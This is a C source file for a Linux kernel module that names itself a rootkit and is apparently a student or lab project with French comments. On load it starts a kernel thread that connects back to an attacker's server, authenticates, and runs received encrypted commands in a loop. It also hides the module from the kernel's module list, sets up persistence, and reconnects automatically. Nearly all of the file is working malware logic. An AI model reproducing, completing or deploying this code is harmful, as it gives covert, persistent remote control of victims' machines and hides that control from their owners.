#include "rootkit.h"

// Variables globales
struct socket *conn_socket = {0};
struct task_struct *thread = {0};
char current_dir[PATH_MAX] = "/";
struct list_head *prev_module;
short hidden = 0;

// Boucle principale qui écoute et exécute les commandes envoyées par l'attaquant
void command_loop(void) {
    char cmd[MAX_CMD_LEN] = {0};
    int receive;
    int len;
    int consecutive_failures = 0;
    
    printk(KERN_INFO "[ROOTKIT] Command loop started, waiting for commands...\n");
    
    while (!kthread_should_stop()) {
        memset(cmd, 0, MAX_CMD_LEN);
        
        receive = receive_encrypted_data(cmd, MAX_CMD_LEN);
        
        if (receive <= 0) {
            consecutive_failures++;
            printk(KERN_WARNING "[ROOTKIT] Failed to receive data (attempt %d/3)\n", consecutive_failures);
            
            if (consecutive_failures >= 3) {
                printk(KERN_ALERT "[ROOTKIT] Multiple receive failures - connection appears broken\n");
                break;
            }
            
            msleep(1000);
            continue;
        }
        
        consecutive_failures = 0;
        
        if (receive >= MAX_CMD_LEN) {
            receive = MAX_CMD_LEN - 1;
        }
        cmd[receive] = '\0';
        
        len = strlen(cmd);
        while (len > 0 && (cmd[len - 1] == '\n' || cmd[len - 1] == '\r')) {
            cmd[--len] = '\0';
        }
        
        if (len > 0) {
            printk(KERN_INFO "[ROOTKIT] Executing command: %s\n", cmd);
            execute_and_respond(cmd);
        }
    }
    
    printk(KERN_INFO "[ROOTKIT] Command loop terminated\n");
}

// Thread principal qui gère la connexion vers l'attaquant et relance en cas de coupure
int connect_to_attacker(void *data) {
    printk(KERN_ALERT "[ROOTKIT] === THREAD STARTED ===\n");
    
    while (!kthread_should_stop()) {
        printk(KERN_ALERT "[ROOTKIT] Attempting connection...\n");
        
        if (connect_server() < 0) {
            printk(KERN_INFO "[ROOTKIT] Connection failed, retrying in 5 seconds\n");
            ssleep(5);
            continue;
        }

        printk(KERN_ALERT "[ROOTKIT] Starting authentication...\n");
        if (!authentication_loop()) {
            printk(KERN_ALERT "[ROOTKIT] Authentication failed\n");
            if (conn_socket) {
                sock_release(conn_socket);
                conn_socket = NULL;
            }
            ssleep(5);
            continue;
        }

        printk(KERN_ALERT "[ROOTKIT] Entering command loop...\n");
        command_loop();
        
        printk(KERN_ALERT "[ROOTKIT] Connection interrupted, attempting reconnection...\n");
        
        if (conn_socket) {
            sock_release(conn_socket);
            conn_socket = NULL;
        }
        
        printk(KERN_INFO "[ROOTKIT] Waiting 5 seconds before reconnection attempt\n");
        ssleep(5);
    }
    
    printk(KERN_ALERT "[ROOTKIT] === THREAD STOPPED ===\n");
    return 0;
}

// Fonction appelée au chargement du module : démarre le rootkit
static int __init rootkit_init(void) {
    printk(KERN_ALERT "[ROOTKIT] === MODULE INIT START ===\n");
    printk(KERN_ALERT "[ROOTKIT] Module loaded\n");
    
    printk(KERN_ALERT "[ROOTKIT] Creating thread...\n");
    thread = kthread_run(connect_to_attacker, NULL, "rk_conn");
    if (IS_ERR(thread)) {
        printk(KERN_ERR "[ROOTKIT] Thread FAILED: %ld\n", PTR_ERR(thread));
        return PTR_ERR(thread);
    }
    
    printk(KERN_ALERT "[ROOTKIT] Thread created successfully\n");
    
    hide_module();
    
    printk(KERN_ALERT "[ROOTKIT] Starting persistence...\n");
    set_persistence();
    printk(KERN_ALERT "[ROOTKIT] === MODULE INIT COMPLETE ===\n");
    return 0;
}

// Fonction appelée au déchargement du module : nettoie proprement les ressources
static void __exit rootkit_exit(void) {
    printk(KERN_ALERT "[ROOTKIT] === MODULE EXIT START ===\n");
    
    if (hidden) {
        show_module();
    }
    
    if (thread && !IS_ERR(thread)) {
        printk(KERN_ALERT "[ROOTKIT] Stopping thread...\n");
        kthread_stop(thread);
        printk(KERN_ALERT "[ROOTKIT] Thread stopped\n");
    }
    
    if (conn_socket) {
        printk(KERN_ALERT "[ROOTKIT] Releasing socket...\n");
        sock_release(conn_socket);
        printk(KERN_ALERT "[ROOTKIT] Socket released\n");
    }
    
    printk(KERN_ALERT "[ROOTKIT] Module unloaded\n");
    printk(KERN_ALERT "[ROOTKIT] === MODULE EXIT COMPLETE ===\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Flex-Team");
MODULE_DESCRIPTION("Rootkit with basic connexion and treat some commands");